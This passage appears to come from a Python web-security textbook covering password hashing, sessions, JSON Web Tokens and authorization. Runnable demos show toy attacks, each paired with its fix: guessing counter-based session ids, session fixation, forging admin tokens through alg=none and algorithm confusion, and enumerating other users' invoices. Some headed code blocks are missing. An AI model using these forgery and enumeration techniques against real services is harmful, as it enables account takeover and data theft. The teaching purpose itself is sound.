Only the first. The salt hides duplicates and kills precomputed tables, but SHA-256 is still fast, so a wordlist attack against a single user is quick. You need a slow hash too.
Check yourself: Is the salt a secret?
No. It is stored next to the hash. It only has to be unique and random per password.

Recap
  • A hash is a one-way fingerprint; attackers do not reverse it, they guess and compare.
  • Fast hashes such as SHA-256 let attackers test billions of guesses per second, and unsalted ones expose duplicates.
  • A unique random salt per password defeats shared tables but does not slow guessing.
  • Use a deliberately slow, salted password hash (scrypt, bcrypt, Argon2, PBKDF2) with a cost you can raise.
3.6 — Passwords II: Doing It Right with PBKDF2, scrypt, bcrypt and Argon2

Section 3.5 explained the goal: a unique salt and a slow, tunable hash. Now we build it. In real projects you should reach for a well-reviewed library and let it choose the format: bcrypt (a slow hash with a cost setting, and a 72-byte input limit), Argon2id (the modern default, which also demands memory, so graphics cards gain little), or scrypt (memory-hard, in Python's standard library). Python's standard library also ships PBKDF2, which is widely approved and needs no installation, so we use it for the runnable examples. The design principles are identical for all four.

A good stored password record has four parts: the algorithm name, the cost parameters, the salt, and the hash. Storing the parameters inside the record is what lets you raise the cost next year without breaking old users. Libraries such as bcrypt and Argon2 pack all four into one string automatically; we do the same with a $-separated string.

Hash and verify with PBKDF2, salt and stored parameters
import hashlib, hmac, os ITERATIONS = 20_000 # demo value; real systems use several hundred thousand or more def pbkdf2(pw, salt, iterations): # PBKDF2-HMAC-SHA256, one 32-byte block (RFC 8018) u = hmac.digest(pw, salt + b"\x00\x00\x00\x01", "sha256") t = int.from_bytes(u, "big") for _ in range(iterations - 1): u = hmac.digest(pw, u, "sha256") t ^= int.from_bytes(u, "big") return t.to_bytes(32, "big") def hash_password(password, iterations=ITERATIONS): salt = os.urandom(16) digest = pbkdf2(password.encode(), salt, iterations) return f"pbkdf2_sha256${iterations}${salt.hex()}${digest.hex()}" def verify_password(password, stored): algo, iterations, salt_hex, digest_hex = stored.split("$") digest = pbkdf2(password.encode(), bytes.fromhex(salt_hex), int(iterations)) return hmac.compare_digest(digest.hex(), digest_hex) a = hash_password("sunshine1") b = hash_password("sunshine1") print("record format :", a.split("$")[0], "with", a.split("$")[1], "iterations") print("same pw, records differ:", a != b) print("right password :", verify_password("sunshine1", a)) print("wrong password :", verify_password("Sunshine1", a)) if hasattr(hashlib, "pbkdf2_hmac"): # the C version in the standard library gives the same bytes print("matches hashlib :", pbkdf2(b"pw", b"salt", 100) == hashlib.pbkdf2_hmac("sha256", b"pw", b"salt", 100))
record format : pbkdf2_sha256 with 20000 iterations same pw, records differ: True right password : True wrong password : False matches hashlib : True

What Python does, line by line

  • os.urandom(16) asks the operating system for 16 unpredictable bytes: a fresh salt for every call.
  • pbkdf2 feeds the password and salt through HMAC-SHA256 twenty thousand times, in a chain where each round depends on the last, so one guess cannot skip ahead. We spell it out because it is short and because the browser build of Python has no OpenSSL-backed hashlib.pbkdf2_hmac; on a server, call that C version, which gives identical bytes and runs much faster.
  • The record is stored as one text field: algorithm, iterations, salt, hash. The salt is not secret, so it sits beside the hash.
  • verify_password splits the record, recomputes with the stored salt and iterations, and compares. Two calls with the same password produce different records, yet both verify.

The comparison uses hmac.compare_digest. A normal == on strings stops at the first differing character, so a very precise stopwatch can learn how many leading characters were right. This is a timing attack. compare_digest takes the same time wherever the difference is. For password hashes the risk is small, but for API keys and tokens it is real, so use it everywhere secrets are compared.

Common mistake: passing a string where bytes are needed

A real error from hmac
import hmac try: hmac.digest("sunshine1", b"salt", "sha256") except TypeError as e: print("TypeError:", e)
TypeError: a bytes-like object is required, not 'str'

The message says bytes were expected but a string arrived. The key (our password) and the salt must be bytes: encode the password with .encode() and generate the salt as bytes. Never "fix" this by using a fixed salt string; that recreates the shared-table problem.

scrypt: making guesses need memory

Graphics cards have thousands of tiny cores but little memory per core. scrypt exploits that: each guess must fill a block of memory, roughly 128 x n x r bytes. Raising n (a power of two) raises both time and memory. It is available as hashlib.scrypt where Python was built with OpenSSL support, so the snippet checks for it first. (The browser build of Python may lack it, and then you will see the fallback message instead of the two checks; both outcomes are correct.)

scrypt memory cost and a verify round trip
import hashlib, hmac, os n, r, p = 2**12, 8, 1 print("memory per guess:", 128 * n * r // 1024, "KiB (n=2**12; production often uses 2**15 or more)") if hasattr(hashlib, "scrypt"): salt = os.urandom(16) h1 = hashlib.scrypt(b"sunshine1", salt=salt, n=n, r=r, p=p, dklen=32) h2 = hashlib.scrypt(b"sunshine1", salt=salt, n=n, r=r, p=p, dklen=32) h3 = hashlib.scrypt(b"Sunshine1", salt=salt, n=n, r=r, p=p, dklen=32) print("same input verifies :", hmac.compare_digest(h1, h2)) print("wrong input rejected:", not hmac.compare_digest(h1, h3)) else: print("hashlib.scrypt is not built into this Python; use PBKDF2 here")
memory per guess: 4096 KiB (n=2**12; production often uses 2**15 or more) same input verifies : True wrong input rejected: True

Upgrading old hashes without asking users

You cannot turn a stored hash into a stronger one, because you never held the password. But at every successful login you briefly have the password in hand. That is the moment to check whether the stored parameters are below your current policy and, if so, write a fresh record.

Detect weak records and upgrade at login
import hmac, os POLICY = 20_000 def pbkdf2(pw, salt, iterations): # PBKDF2-HMAC-SHA256, one 32-byte block (RFC 8018) u = hmac.digest(pw, salt + b"\x00\x00\x00\x01", "sha256") t = int.from_bytes(u, "big") for _ in range(iterations - 1): u = hmac.digest(pw, u, "sha256") t ^= int.from_bytes(u, "big") return t.to_bytes(32, "big") def make(pw, it): salt = os.urandom(8) d = pbkdf2(pw.encode(), salt, it) return f"pbkdf2_sha256${it}${salt.hex()}${d.hex()}" def login(pw, stored): algo, it, salt_hex, want = stored.split("$") got = pbkdf2(pw.encode(), bytes.fromhex(salt_hex), int(it)).hex() if not hmac.compare_digest(got, want): return False, stored if int(it) < POLICY: print(" upgrading from", it, "to", POLICY, "iterations") stored = make(pw, POLICY) return True, stored old = make("sunshine1", 1_000) ok, new = login("sunshine1", old) print("logged in:", ok, "| now uses", new.split("$")[1], "iterations")
upgrading from 1000 to 20000 iterations logged in: True | now uses 20000 iterations

Throttling guesses at the front door

Slow hashing protects a stolen table. An online attack guesses against the live login page, so you also limit attempts: count failures per account and per address, delay or lock after a few, and never say which of email or password was wrong. Add multi-factor authentication (a second proof such as an app code) for anything valuable. The simulation below uses a pretend clock, so it is deterministic.

Lock an account after repeated failures
MAX_FAILS, LOCK_SECONDS = 3, 300 state = {} # user -> (fail_count, locked_until) def attempt(user, ok, now): fails, locked_until = state.get(user, (0, 0)) if now < locked_until: return f"t={now}: locked for {locked_until - now}s more" if ok: state[user] = (0, 0) return f"t={now}: welcome" fails += 1 state[user] = (fails, now + LOCK_SECONDS if fails >= MAX_FAILS else 0) return f"t={now}: failed ({fails}/{MAX_FAILS})" for now, ok in [(0, False), (5, False), (10, False), (20, True), (400, True)]: print(attempt("asha", ok, now))
t=0: failed (1/3) t=5: failed (2/3) t=10: failed (3/3) t=20: locked for 290s more t=400: welcome

At time 20 even the correct password is refused, because the account is locked. That protects against guessing, but note the trade-off: an attacker can now lock Asha out on purpose (a denial of service). Real systems often use growing delays plus per-address limits instead of hard locks.

Check yourself: Why store the iteration count inside the record?
So each record carries the parameters that made it. You can raise the policy later and still verify old records with their own settings, then upgrade them at the next login.
Check yourself: You want to strengthen existing users' hashes without a password reset. When can you re-hash?
At a successful login, when the plaintext is briefly available. Never before.

Recap
  • Store one self-describing record: algorithm, cost, salt, hash. Use a library (Argon2id or bcrypt) when you can; PBKDF2 or scrypt from hashlib otherwise.
  • Compare secrets with hmac.compare_digest, not ==.

  • Throttle online guessing, keep error messages generic, and add MFA for valuable accounts.
3.7 — Sessions: Who Is This Request From?

HTTP has no memory. Each request arrives alone, and the server has no built-in way to know that the last ten requests came from Asha. After Asha logs in, the server needs to hand her something to show on every later request, so she does not have to type her password again. The classic answer is the session: the server remembers "Asha is logged in" in a table, gives the browser a random label for that table row (the session id), and the browser sends that label back in a cookie (a small value the browser stores and attaches to every request to that site). Think of a coat-check ticket. The ticket is meaningless by itself, but whoever holds it gets Asha's coat.

That last sentence is the attacker's view. A session id is the login. If I can steal it, guess it, or trick Asha into using one I chose, I do not need her password. Every defence in this section protects the ticket.

Session lifecycle and where it is attacked
  browser                                   server (session table)
     | -- POST /login (email + password) --> | check password
     |                                       | create NEW id "k3x9..."  -> {user: asha, expires: t+30m}
     | <-- Set-Cookie: sid=k3x9...; flags -- |
     | -- GET /orders  Cookie: sid=k3x9... ->| look up id, check expiry, load user
     | -- POST /logout ---------------------->| DELETE the row (server-side)
  attacks:  guess the id | steal it (XSS, sniffing) | fixation (plant a known id before login) | never expires

Attack 1: guessable session ids

The developer wants ids that are easy to debug and uses a counter: session 1, session 2, session 3. The attacker logs in as themselves, sees they got id 1041, and tries 1040, 1039 and so on. Every hit is another customer's account. Predictable also means "derived from something guessable", such as a hash of the user name and the time of day.

Walking a counter to hijack other users
class WeakStore: def __init__(self): self.next_id = 1000 self.table = {} def login(self, user): self.next_id += 1 sid = str(self.next_id) self.table[sid] = user return sid store = WeakStore() store.login("asha"); store.login("ben"); store.login("chen") mine = store.login("mallory") # the attacker's own, legitimate session print("attacker's id:", mine) for guess in range(int(mine) - 1, int(mine) - 4, -1): print("guess", guess, "->", store.table.get(str(guess), "nothing"))
attacker's id: 1004 guess 1003 -> chen guess 1002 -> ben guess 1001 -> asha

The fix is an id that cannot be predicted: at least 128 bits of output from a cryptographically secure random number generator. In Python that is the secrets module, never random, which is designed for simulations and whose next value can be worked out from earlier ones. With 128 random bits, guessing an id is hopeless: there are more possibilities than grains of sand on Earth.

Secure ids and what 128 bits means

length of id text: 43 characters two ids equal? False searching 2**128 ids at 10**12 per second: 1.1e+19 years

Attack 2: session fixation

In session fixation the attacker does not steal a ticket. They hand Asha one they already hold. Suppose the site accepts a session id from the URL or cookie even before login, and keeps the same id after login. The attacker visits the site, gets id abc, and sends Asha a link that sets abc as her cookie. Asha logs in. The server attaches her account to abc. The attacker, who also holds abc, is now logged in as Asha. The defence is one line: issue a brand-new id at login (and again at any privilege change), discarding the old one.

Fixation against a naive store, then the fix
import secrets class Store: def __init__(self, rotate): self.rotate, self.table = rotate, {} def login(self, sid, user): if self.rotate: self.table.pop(sid, None) sid = secrets.token_hex(16) # brand-new id after authentication self.table[sid] = user return sid for rotate in (False, True): store = Store(rotate) planted = "abc-known-to-attacker" store.table[planted] = None # attacker created an anonymous session victim_sid = store.login(planted, "asha") # Asha logs in using the planted id print(f"rotate={rotate!s:5} attacker's id now maps to:", store.table.get(planted))
rotate=False attacker's id now maps to: asha rotate=True attacker's id now maps to: None

What Python does, line by line

  • The loop runs the same scenario twice: once with a vulnerable store, once with a store that rotates ids.
  • The attacker plants the id abc-known-to-attacker in Asha's browser. The store already has an anonymous row for it.
  • Without rotation, login writes "asha" onto the row the attacker also holds. The attacker's lookup now returns asha.
  • With rotation, the old row is removed and a fresh random id is given to Asha. The attacker's id now maps to nothing.

Expiry and logout belong on the server

A session should die in three ways: after a maximum idle time (say 30 minutes without use), after an absolute lifetime (say 12 hours regardless), and on logout. Logout must delete the row on the server. Merely deleting the cookie in the browser leaves a stolen copy of the id fully working. This is the strongest argument for server-side sessions: you can kill one instantly.

Idle timeout, absolute lifetime and real logout
IDLE, ABSOLUTE = 1800, 43200 # seconds table = {} def create(sid, user, now): table[sid] = {"user": user, "created": now, "last": now} def lookup(sid, now): row = table.get(sid) if row is None: return "no such session" if now - row["last"] > IDLE or now - row["created"] > ABSOLUTE: del table[sid] return "expired" row["last"] = now return "ok: " + row["user"] create("s1", "asha", 0) print(lookup("s1", 600)) # 10 minutes: fine print(lookup("s1", 600 + 3000)) # idle for 50 minutes: dead print(lookup("s1", 4000)) # gone for good create("s2", "ben", 0) del table["s2"] # logout = delete server-side print(lookup("s2", 10))
ok: asha expired no such session no such session

Cookie flags: the ticket's protective sleeve

A cookie carries attributes that tell the browser how careful to be. Four matter. HttpOnly hides the cookie from JavaScript, so a script injected into the page (Section 3.13) cannot read it. Secure sends it only over HTTPS. SameSite=Lax (or Strict) stops the browser attaching it to most requests started by other sites, which blunts cross-site request forgery. Max-Age bounds the lifetime. The standard library can build the header for you.

Build a hardened Set-Cookie header
from http.cookies import SimpleCookie c = SimpleCookie() c["sid"] = "k3x9-example-value" c["sid"]["httponly"] = True c["sid"]["secure"] = True c["sid"]["samesite"] = "Lax" c["sid"]["path"] = "/" c["sid"]["max-age"] = 1800 print(c.output()) try: c["sid"]["secur"] = True # a typo in an attribute name except Exception as e: print(type(e).__name__ + ":", e)

The last lines show a real mistake: misspelling an attribute. The library refuses with CookieError: Invalid attribute 'secur'. In many frameworks a misspelled flag is silently ignored instead, and the cookie ships without protection. After setting flags, read the actual Set-Cookie header in your browser's developer tools to confirm.

  • A session id is a bearer ticket: whoever holds it is logged in. Generate it with secrets, at least 128 bits.
  • Rotate the id at login to defeat fixation; expire on idle, absolute time and logout, all enforced server-side.

3.8 — JSON Web Tokens: Signed Claims and How They Are Forged

Sessions keep the truth on the server. That is safe, but every request needs a table lookup, and several servers must share the table. A JSON Web Token (JWT) takes the opposite approach: the server puts the facts into the token itself ("this is Asha, role customer, valid until 10:30"), signs it, and hands it out. Any server that knows the signing key can check the signature and trust the facts without a lookup. It is like a concert wristband with a hologram: the gate does not phone the box office, it checks the hologram.

The convenience has a price, and attackers know it. The server now decides whether to trust a token based on what the token says about itself. Most real JWT attacks are variations on one theme: getting the verifier to believe something the attacker wrote.

Anatomy of a JWT
  eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiJhc2hhIiwicm9sZSI6ImN1c3RvbWVyIn0 . 9xQ...signature
  \___ header ________/   \___ payload (claims) ___________________/   \_ signature _/
   {"alg":"HS256"}         {"sub":"asha","role":"customer","exp":...}   HMAC(key, header.payload)

  each part is base64url text (encoded, NOT encrypted: anyone can read the payload)
  the signature proves nobody changed header or payload since the key holder signed them

Build one and read it

A JWT is three base64url pieces joined by dots. Base64url is a way to write bytes as safe text; it hides nothing. The signature here is HMAC-SHA256: a keyed fingerprint that only someone holding the secret key can produce. The code uses only the standard library so you can see every step.

Create and verify an HS256 token by hand
import base64, hashlib, hmac, json def b64e(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode() def b64d(text): return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4)) SECRET = b"toy-signing-key-for-class" def sign(claims, key=SECRET): head = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()) body = b64e(json.dumps(claims).encode()) sig = hmac.new(key, f"{head}.{body}".encode(), hashlib.sha256).digest() return f"{head}.{body}.{b64e(sig)}" token = sign({"sub": "asha", "role": "customer"}) head, body, sig = token.split(".") print("header :", json.loads(b64d(head))) print("payload :", json.loads(b64d(body)), "<- readable by anyone, no key needed") print("sig ok :", hmac.compare_digest(b64e(hmac.new(SECRET, f"{head}.{body}".encode(), hashlib.sha256).digest()), sig))
header : {'alg': 'HS256', 'typ': 'JWT'} payload : {'sub': 'asha', 'role': 'customer'} <- readable by anyone, no key needed sig ok : True

What Python does, line by line

  • b64e and b64d convert bytes to and from URL-safe text. JWTs drop the trailing = padding, so b64d adds it back.
  • sign encodes a header naming the algorithm, encodes the claims, and signs the string header.payload with the secret.
  • Splitting the token on dots gives the three parts back. Reading the payload needed no key: the token is signed, not secret. Never put passwords or private data in it.
  • Verification recomputes the signature and compares it in constant time.

Common mistake: forgetting the padding

A real error from base64
import base64, binascii piece = "eyJzdWIiOiJhc2hhIn0" # padding "=" was stripped, as JWTs do try: base64.urlsafe_b64decode(piece) except binascii.Error as e: print("binascii.Error:", e) print(base64.urlsafe_b64decode(piece + "=" * (-len(piece) % 4)))
binascii.Error: Incorrect padding b'{"sub":"asha"}'

Incorrect padding means the length is not a multiple of four. Add back the missing = characters, as the last line does, and it decodes.

Attack 1: alg = none

The header says which algorithm signed the token. A naive verifier reads that field and does what it says. The JWT standard defines the algorithm none, meaning "unsigned". An attacker can write any claims they like, set alg to none, leave the signature empty, and a trusting verifier waves it through. Several real libraries once accepted this.

Forge an admin token against a trusting verifier
import base64, hashlib, hmac, json def b64e(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode() def b64d(t): return base64.urlsafe_b64decode(t + "=" * (-len(t) % 4)) KEY = b"toy-signing-key-for-class" def verify_naive(token): head, body, sig = token.split(".") alg = json.loads(b64d(head))["alg"] # obeys whatever the token says if alg == "none": return json.loads(b64d(body)) good = b64e(hmac.new(KEY, f"{head}.{body}".encode(), hashlib.sha256).digest()) return json.loads(b64d(body)) if hmac.compare_digest(good, sig) else None forged = ".".join([b64e(json.dumps({"alg": "none"}).encode()), b64e(json.dumps({"sub": "mallory", "role": "admin"}).encode()), ""]) print("forged token accepted as:", verify_naive(forged))
forged token accepted as: {'sub': 'mallory', 'role': 'admin'}

The attacker never touched the key. The verifier let the token choose its own checking rules. The principle to remember: the verifier, not the token, decides which algorithms are acceptable. Pin them in code, for example algorithms=["HS256"] in a library call, and reject everything else.

Attack 2: algorithm confusion

The subtler cousin appears when a service uses an asymmetric algorithm such as RS256: a private key signs, and a public key (which everyone may have) verifies. If the verifier accepts HS256 as well and feeds the same "verification key" to both, the attacker takes the public key, uses it as an HMAC secret, signs a forged token with alg: HS256, and the verifier happily validates it. Below, a toy stand-in plays the RS256 part (a real one needs an RSA library), but the flaw is genuine: one key object serving two very different algorithms.

Public key used as an HMAC secret
import base64, hashlib, hmac, json def b64e(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode() def b64d(t): return base64.urlsafe_b64decode(t + "=" * (-len(t) % 4)) PUBLIC_KEY = b"-----PUBLIC KEY (published on the website)-----" def toy_rs256_ok(signing_input, sig): return False # stand-in: only the real private key could make this true def verify(token, pinned=None): head, body, sig = token.split(".") alg = json.loads(b64d(head))["alg"] if pinned and alg != pinned: return f"rejected: alg {alg} is not {pinned}" signing = f"{head}.{body}".encode() if alg == "RS256": ok = toy_rs256_ok(signing, sig) elif alg == "HS256": ok = hmac.compare_digest(b64e(hmac.new(PUBLIC_KEY, signing, hashlib.sha256).digest()), sig) else: return "rejected: unknown alg" return json.loads(b64d(body)) if ok else "rejected: bad signature" h = b64e(json.dumps({"alg": "HS256"}).encode()) b = b64e(json.dumps({"sub": "mallory", "role": "admin"}).encode()) forged = f"{h}.{b}." + b64e(hmac.new(PUBLIC_KEY, f"{h}.{b}".encode(), hashlib.sha256).digest()) print("unpinned verifier:", verify(forged)) print("pinned to RS256 :", verify(forged, pinned="RS256"))
unpinned verifier: {'sub': 'mallory', 'role': 'admin'} pinned to RS256 : rejected: alg HS256 is not RS256

Pinning removes the confusion: an HS256 token is rejected before any key is touched. A good library also refuses to let one key object serve two algorithm families. Keep a short allowlist, and look at what your library does by default.

Verify the claims, not just the signature

A valid signature proves the token is genuine. It does not prove the token is meant for you, right now. Check the registered claims: exp (expiry time), nbf (not before), iss (issuer: who made it), aud (audience: who it is for) and sub (subject: which user). A token issued to your mobile app for another service must not open your API, even though the signature is perfect.

Validate exp, nbf, iss and aud with a fake clock

3.9 — Tokens in Practice: Lifetime, Refresh, Storage and Revocation

Section 3.8 showed how tokens are forged. This section is about living with tokens safely. The central problem is that a stateless token cannot be recalled. Suppose Asha's phone is stolen and the token in it is good for 30 days. The server checks the signature and expiry, both fine, and lets the thief in until the token runs out. With a session table you delete the row and the ticket is dead. With a self-contained token you have nothing to delete.

The standard compromise is two tokens. An access token is short-lived (five to fifteen minutes) and sent on every request. A refresh token is long-lived, stored more carefully, and used only to ask the login server for a new access token. If an access token leaks, the damage window is minutes. The refresh token is the one you can track and cancel, because it is checked against a server-side record.

Refresh token rotation with reuse detection
  login ------------> access A1 (10 min)  + refresh R1
  A1 expires
  send R1 ----------> access A2          + refresh R2      (R1 marked USED)
  send R2 ----------> access A3          + refresh R3      (R2 marked USED)

  a thief who copied R1 earlier sends R1 again:
  send R1 ----------> server sees a USED token replayed -> revoke the whole family (R3 too)
                      both thief and Asha must log in again: theft is now visible

Rotation and reuse detection

Refresh token rotation means every refresh hands out a brand-new refresh token and invalidates the old one. Each token is single-use. A legitimate client always presents the newest one. So if an old token appears, someone has a copy. Two parties are using the same family, and the safest response is to revoke every token in that family. This is reuse detection. The simulation stores only outcomes, so the output is deterministic.

Rotate refresh tokens and catch a replay
import secrets families = {} # refresh token -> {"family": id, "used": bool} revoked = set() # family ids that were cancelled counter = 0 def issue(family): tok = "R-" + secrets.token_hex(8) families[tok] = {"family": family, "used": False} return tok def refresh(tok): rec = families.get(tok) if rec is None or rec["family"] in revoked: return None, "rejected (unknown or revoked)" if rec["used"]: revoked.add(rec["family"]) return None, "REUSE DETECTED: family revoked" rec["used"] = True return issue(rec["family"]), "ok: new refresh token issued" r1 = issue("fam-asha") r2, msg = refresh(r1); print("R1 ->", msg) r3, msg = refresh(r2); print("R2 ->", msg) _, msg = refresh(r1); print("R1 again (thief) ->", msg) _, msg = refresh(r3); print("R3 (Asha, newest) ->", msg)
R1 -> ok: new refresh token issued R2 -> ok: new refresh token issued R1 again (thief) -> REUSE DETECTED: family revoked R3 (Asha, newest) -> rejected (unknown or revoked)

The last line shows the cost of the policy: after a replay even the legitimate newest token is refused, so Asha must log in again. That is the intended behaviour: better one inconvenient login than a silent thief.

Revoking access tokens before they expire

Sometimes five minutes is too long: an administrator is fired, a password is reset. Two mechanisms help. A denylist keeps the ids (jti claims) of cancelled tokens until they would have expired anyway. A token version stores a counter per user in the database and puts it in each token; bumping the counter kills every older token at once. Both bring back a small lookup, which is the honest trade: you give up a little statelessness to regain control.

A per-user token version kills all older tokens
user_version = {"asha": 1, "ben": 1} def check(claims): if claims["ver"] != user_version[claims["sub"]]: return "rejected: token version is stale" return "ok: " + claims["sub"] asha_token = {"sub": "asha", "ver": 1} ben_token = {"sub": "ben", "ver": 1} print(check(asha_token)) user_version["asha"] += 1 # Asha resets her password, or reports the phone stolen print(check(asha_token)) # every old token for Asha dies print(check(ben_token)) # other users unaffected
ok: asha rejected: token version is stale ok: ben

Where should the browser keep the token?

The token has to live somewhere. Two common choices have opposite weaknesses. localStorage is readable by any JavaScript on the page, so a single cross-site scripting bug (Section 3.13) lets an attacker copy the token. An HttpOnly cookie cannot be read by scripts, but the browser attaches it automatically, so you must defend against cross-site request forgery with SameSite and anti-forgery tokens. Neither is free; for a typical browser app, an HttpOnly; Secure; SameSite cookie holding an opaque session or refresh token is the safer default. The model below makes the difference visible.

3.10 — Authorization I: IDOR, BOLA and Role Checks

Authentication answers "who are you?". Authorization answers "are you allowed to do this, to this thing?". The two are easy to confuse, and the gap between them is the top-ranked risk on the OWASP list. Recall the invoice story from Section 3.1: Asha is properly logged in, her session is fine, and yet changing /invoices/17 to /invoices/18 shows Chen's invoice. Nothing was hacked in the usual sense. The server checked that someone was logged in and never asked whose invoice it was.

This bug has two names. IDOR (insecure direct object reference) is the older web-security term. BOLA (broken object level authorization) is the API-security name for the same flaw. From the attacker's side it is the friendliest bug there is: no special tools, only a counter that goes up.

Where the missing check lives
  request: GET /invoices/18      cookie: Asha's session
      |
      v
  [ authentication ]  who is this?           -> Asha        (present)
      |
      v
  [ authorization  ]  may Asha read #18?     -> ???         (MISSING: the bug)
      |
      v
  [ database       ]  SELECT ... WHERE id = 18  -> Chen's invoice goes back to Asha

The vulnerable endpoint and an enumeration attack

An endpoint that checks the login but not the owner
INVOICES = { 1: {"owner": "asha", "total": 12.50, "note": "tea"}, 2: {"owner": "chen", "total": 99.00, "note": "kettle"}, 3: {"owner": "ben", "total": 4.00, "note": "mug"}, 4: {"owner": "chen", "total": 30.00, "note": "gift for chen's sister"}, } def get_invoice_vulnerable(current_user, invoice_id): if current_user is None: return 401, "log in first" inv = INVOICES.get(invoice_id) return (200, inv) if inv else (404, "not found") # The attacker is asha, and counts upward. for i in range(1, 5): status, body = get_invoice_vulnerable("asha", i) print(i, status, body if status != 200 else f'{body["owner"]}: {body["note"]}')
1 200 asha: tea 2 200 chen: kettle 3 200 ben: mug 4 200 chen: gift for chen's sister

Asha sees three other customers' invoices. The fix is an ownership check in the same place as the lookup. Two design points matter. First, return 404 Not Found, not 403, for objects the caller may not see. A 403 confirms "that id exists but is not yours", which helps an attacker map the system. Second, put the check in one shared function so it cannot be forgotten on the next endpoint.

Fix: load the object only through an owner-aware function
INVOICES = {1: {"owner": "asha", "total": 12.5}, 2: {"owner": "chen", "total": 99.0}, 3: {"owner": "ben", "total": 4.0}, 4: {"owner": "chen", "total": 30.0}} def load_invoice_for(user, invoice_id): inv = INVOICES.get(invoice_id) if inv is None or inv["owner"] != user: # same answer either way return None return inv def get_invoice(user, invoice_id): if user is None: return 401, "log in first" inv = load_invoice_for(user, invoice_id) return (200, inv) if inv else (404, "not found") visible = [i for i in range(1, 5) if get_invoice("asha", i)[0] == 200] print("asha can see ids:", visible) print("chen's #2 as asha:", get_invoice("asha", 2)) print("chen's #2 as chen:", get_invoice("chen", 2)) print("invented #99 :", get_invoice("asha", 99))
asha can see ids: [1] chen's #2 as asha: (404, 'not found') chen's #2 as chen: (200, {'owner': 'chen', 'total': 99.0}) invented #99 : (404, 'not found')

Notice that a real invoice belonging to someone else and an invoice that does not exist give the identical answer. The attacker learns nothing from probing. That last property is worth its own test.

Random ids are not authorization

A common half-fix is to replace 17 with a long random identifier (a UUID). This makes guessing impractical, which is a helpful extra layer. It is not access control. Identifiers leak: they appear in URLs, emails, logs, screenshots and browser history. A person who obtains Chen's invoice link, by any route, can open it if the server never checks ownership. Unpredictable ids are defence in depth, never the defence.

Function-level checks: roles

Object checks ask "is this yours?". Function-level checks ask "may your kind of user do this action at all?". Refunding an order should be allowed for support staff and admins, not customers. The common model is role-based access control (RBAC): users have roles, roles have permissions, and each action requires a permission. The data structure is small and easy to audit, which is its strength.

A role-to-permission table and a decorator
ROLES = { "customer": {"read_own_order"}, "support": {"read_own_order", "read_any_order", "refund"}, "admin": {"read_own_order", "read_any_order", "refund", "manage_users"}, } USERS = {"asha": "customer", "sam": "support", "ben": "admin"} def requires(permission): def wrap(fn): def inner(user, *args): role = USERS.get(user) if permission not in ROLES.get(role, set()): raise PermissionError(f"role {role!r} may not {permission!r}") return fn(user, *args) return inner return wrap @requires("refund") def refund(user, order_id): return f"order {order_id} refunded by {user}" for who in ("sam", "asha", "nobody"): try: print(refund(who, 7)) except PermissionError as e: print("PermissionError:", e)
order 7 refunded by sam PermissionError: role 'customer' may not 'refund' PermissionError: role None may not 'refund'

Read the last two lines: an unknown user has role None, which gets an empty permission set, so the result is a denial. That is the default deny rule from Section 3.2 at work: access exists only if a rule grants it. The error message can be read exactly: it names the role and the permission that was missing.

Common mistake: hiding the button

A frequent junior mistake is to fix "customers can refund" by removing the Refund button from the customer's page. The button was never the security. Attackers do not use your page; they send requests directly. Anything the client sends must be checked on the server, every time, whatever the interface shows. In the code above the @requires line, not any user interface, is what stops Asha.

Check yourself: Why return 404 rather than 403 for another user's invoice?
403 confirms the invoice exists, letting an attacker enumerate valid ids and learn about the system. 404 gives the same answer as a missing object.
Check yourself: The API uses UUID invoice ids. Do we still need the ownership check?
Yes. UUIDs are hard to guess but they leak through links, logs and mail. They reduce risk; only an ownership check enforces access.

Recap
  • Authentication says who you are; authorization says what you may touch. Missing object-level checks (IDOR/BOLA) are the most common serious API bug.
  • Check ownership in the lookup itself, and return the same 404 for "not yours" and "does not exist".
  • Random ids reduce guessing but never replace an access check.
  • RBAC maps roles to permissions; default deny; enforce on the server, never only in the interface.
3.11 — Authorization II: ABAC, Tenant Isolation and Mass Assignment

Roles are simple, and simple is good, until the rules grow. Corner Shop now has support staff who work regionally: Sam may refund orders in the north region only, only up to 50 in value, only during a shift. You could invent roles like support_north_small_daytime, but the list explodes. Attribute-based access control (ABAC) replaces the explosion with a rule that reads attributes: facts about the user (region, role), the resource (order region, amount) and the situation (time). The decision becomes a small function, and it can be tested exhaustively.

An ABAC decision function and a table of cases
def can_refund(user, order, hour): if user["role"] == "admin": return True if user["role"] != "support": return False return (order["region"] == user["region"] # resource matches user's region and order["amount"] <= 50 # small refunds only and 8 <= hour < 18) # during a shift sam = {"role": "support", "region": "north"} cases = [ ("north, 30, 10:00", sam, {"region": "north", "amount": 30}, 10, True), ("south, 30, 10:00", sam, {"region": "south", "amount": 30}, 10, False), ("north, 80, 10:00", sam, {"region": "north", "amount": 80}, 10, False), ("north, 30, 22:00", sam, {"region": "north", "amount": 30}, 22, False), ("customer asha", {"role": "customer", "region": "north"}, {"region": "north", "amount": 5}, 10, False), ] for name, user, order, hour, expected in cases: got = can_refund(user, order, hour) print(f"{name:18} -> {got!s:5} {'ok' if got == expected else 'MISMATCH'}")
north, 30, 10:00 -> True ok south, 30, 10:00 -> False ok north, 80, 10:00 -> False ok north, 30, 22:00 -> False ok customer asha -> False ok

Each row is a small test written before trusting the rule. RBAC and ABAC are not rivals: many systems use roles for the broad "what kind of person" question and attributes for the fine print. The risk with ABAC is complexity, so keep the policy in one place and test the boundaries (exactly 50, exactly 8 o'clock).

Tenant isolation: the most expensive bug in shared software

Many products serve many customer companies from one database. Each company is a tenant. Every row carries a tenant_id, and every query must filter on it. Forget the filter once and a customer of Company A reads Company B's data, which for a business-to-business product is often a company-ending incident. The attacker's view: log in to your own tenant, find any endpoint that looks up by id, and ask for ids from another tenant.

A missing tenant filter, and a repository that cannot forget
